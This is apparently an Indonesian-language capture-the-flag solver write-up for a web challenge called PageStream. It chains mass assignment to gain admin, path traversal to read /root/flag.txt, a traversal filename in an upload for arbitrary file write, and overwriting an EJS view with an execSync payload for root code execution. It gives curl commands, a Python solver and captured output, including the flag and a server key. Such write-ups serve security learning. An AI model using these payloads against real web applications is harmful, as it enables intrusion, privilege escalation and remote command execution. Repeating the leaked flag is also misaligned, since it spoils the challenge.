# PageStream — Eksploitasi / Solver

[← Overview](51-pagestream.md) · [Index](index.md)

### 3.1 Strategi

- Mass assign `role=admin`.
- Cara tercepat: baca `/root/flag.txt` lewat `/view`.
- Untuk demonstrasi penuh sesuai deskripsi: upload file traversal untuk menimpa view, lalu RCE.

### 3.2 Langkah exploit (live)

Register, login, dan mass assignment:

```bash
BASE=http://s1.nfx.my.id:43659
USER=ps$(date +%s | tail -c 6)
curl -sS -c cj -X POST -d "username=$USER&password=pw12345" "$BASE/register"
curl -sS -c cj -X POST -d "username=$USER&password=pw12345" "$BASE/login"
curl -sS -b cj -X POST -d 'role=admin&bio=pwned' "$BASE/profile"
curl -sS -b cj "$BASE/dashboard" | grep -o 'Administrator'
```

Baca flag via traversal:

```bash
curl -sS -b cj "$BASE/view?file=../../root/flag.txt"
# NFX{f3w_n_d4y_ch41ns_f0r_w3b_pwn_1s_n0t_th4t_h4rd_7734a1}
```

Bukti arbitrary write:

```bash
curl -sS -b cj -X POST "$BASE/post/new" \
  -F 'title=proof' -F 'content=proof' \
  -F 'image=@/dev/null;filename=../../pwned-pagestream.txt;type=text/plain'
# HTTP 302 /dashboard

curl -sS -b cj "$BASE/view?file=../../pwned-pagestream.txt"
# PAGESTREAM-WRITE-PROOF
```

RCE via overwrite view:

```bash
cat > /tmp/pwn.ejs <<'EOF'
<%= global.process.mainModule.require('child_process')
    .execSync('id; echo ---KEY---; cat /etc/pagestream.key; echo ---FLAG---; '
            + '/readflag $(cat /etc/pagestream.key)').toString() %>
EOF

curl -sS -b cj -X POST "$BASE/post/new" \
  -F 'title=rce' -F 'content=rce' \
  -F 'image=@/tmp/pwn.ejs;filename=../views/dashboard.ejs;type=text/plain'
# HTTP 302 /dashboard

curl -sS -b cj "$BASE/dashboard"
```

Script lengkap ada di `assets/pagestream/exploit_pagestream.py`; inti:

```python
S.post(BASE + "/register", data={"username": USER, "password": PASS})
S.post(BASE + "/login",    data={"username": USER, "password": PASS})
S.post(BASE + "/profile",  data={"role": "admin", "bio": "pwned"})
r = S.get(BASE + "/view", params={"file": "../../root/flag.txt"})
print(r.text)
```

### 3.3 Output asli

Mass assignment + LFI:

```text
===== POST /profile role=admin =====
POST http://s1.nfx.my.id:43659/profile
HTTP 200

===== GET /dashboard (role now admin) =====
GET http://s1.nfx.my.id:43659/dashboard
HTTP 200
[+] admin badge present: True

===== GET /view?file=../../root/flag.txt =====
HTTP 200  content-type=text/plain; charset=utf-8
'NFX{f3w_n_d4y_ch41ns_f0r_w3b_pwn_1s_n0t_th4t_h4rd_7734a1}\n'
[+] FLAG = NFX{f3w_n_d4y_ch41ns_f0r_w3b_pwn_1s_n0t_th4t_h4rd_7734a1}
```

Arbitrary write + readback:

```text
upload: 302 /dashboard
read ../../pwned-pagestream.txt -> 200 'PAGESTREAM-WRITE-PROOF\n'
read ../../etc/hostname -> 200 '79d4b7833cd4\n'
```

RCE:

```text
upload overwrite dashboard.ejs: 302 /dashboard
GET /dashboard -> 200
uid=0(root) gid=0(root) groups=0(root)
---KEY---
4da4b2091f8dca166bd4ad4dc0cc6d2d---FLAG---
NFX{f3w_n_d4y_ch41ns_f0r_w3b_pwn_1s_n0t_th4t_h4rd_7734a1}

FLAG=NFX{f3w_n_d4y_ch41ns_f0r_w3b_pwn_1s_n0t_th4t_h4rd_7734a1}
```
